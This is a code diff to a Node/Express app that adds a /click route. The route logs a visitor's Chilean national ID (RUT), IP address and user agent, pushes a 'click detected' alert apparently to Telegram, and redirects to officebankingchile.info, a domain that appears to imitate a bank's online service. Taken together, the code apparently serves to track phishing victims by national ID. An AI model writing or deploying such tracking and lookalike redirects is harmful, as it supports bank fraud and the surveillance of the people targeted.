@@ -764,8 +764,27 @@ app.post("/telegram-webhook", async (req, res) => {
 });
 
 // =======================
-//   ROOT / 404
+//   TRACKING POR RUT
 // =======================
+app.get("/click", (req, res) => {
+  const rut = req.query.rut || "desconocido";
+  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
+  const userAgent = req.headers["user-agent"] || "desconocido";
+
+  db.prepare(`
+    INSERT INTO tracking_clicks (rut, ip, user_agent)
+    VALUES (?, ?, ?)
+  `).run(rut, ip, userAgent);
+
+  enviarEventoTecnico(`🔎 Clic detectado
+RUT: ${rut}
+IP: ${ip}
+UA: ${userAgent}
+Hora: ${new Date().toLocaleString("es-CL")}`);
+
+  res.redirect("https://www.officebankingchile.info/");
+});
+
 // =======================
 //   ROOT
 // =======================
